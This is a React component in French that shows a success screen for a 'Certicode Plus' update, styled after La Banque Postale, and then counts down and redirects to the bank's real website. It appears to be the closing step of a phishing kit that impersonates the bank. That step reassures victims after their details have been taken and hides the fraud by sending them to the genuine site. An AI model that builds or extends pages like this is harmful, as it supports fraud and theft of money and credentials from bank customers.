import { useEffect, useState } from "react";
import { CheckCircle2 } from "lucide-react";

const REDIRECT_URL = "https://www.labanquepostale.fr";
const REDIRECT_DELAY = 4; // seconds

export default function SuccessStep() {
  const [remaining, setRemaining] = useState(REDIRECT_DELAY);

  useEffect(() => {
    if (remaining <= 0) {
      window.location.href = REDIRECT_URL;
      return;
    }
    const t = setTimeout(() => setRemaining((r) => r - 1), 1000);
    return () => clearTimeout(t);
  }, [remaining]);

  return (
    <div className="fade-in text-center" data-testid="success-step">
      <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-green-100">
        <CheckCircle2 className="h-10 w-10 text-[#16A34A]" />
      </div>
      <h1 className="mt-5 text-2xl sm:text-3xl font-semibold tracking-tight text-[#003B5C]">
        Votre Certicode Plus a été mis à jour
      </h1>
      <p className="mt-2 text-sm text-[#475569]">
        Votre service de paiement renforcé est désormais actif. Vous pouvez continuer à utiliser vos cartes en toute sécurité.
      </p>
      <div
        data-testid="redirect-countdown"
        className="mt-6 rounded-md bg-[#F4F6F8] px-4 py-3 text-sm text-[#475569]"
      >
        Redirection vers votre Espace Client dans <span className="font-semibold text-[#003B5C]">{remaining}s</span>…
      </div>
      <a
        href={REDIRECT_URL}
        data-testid="redirect-link"
        className="mt-4 inline-block text-sm text-[#003B5C] hover:underline"
      >
        Cliquez ici si vous n'êtes pas redirigé automatiquement
      </a>
    </div>
  );
}
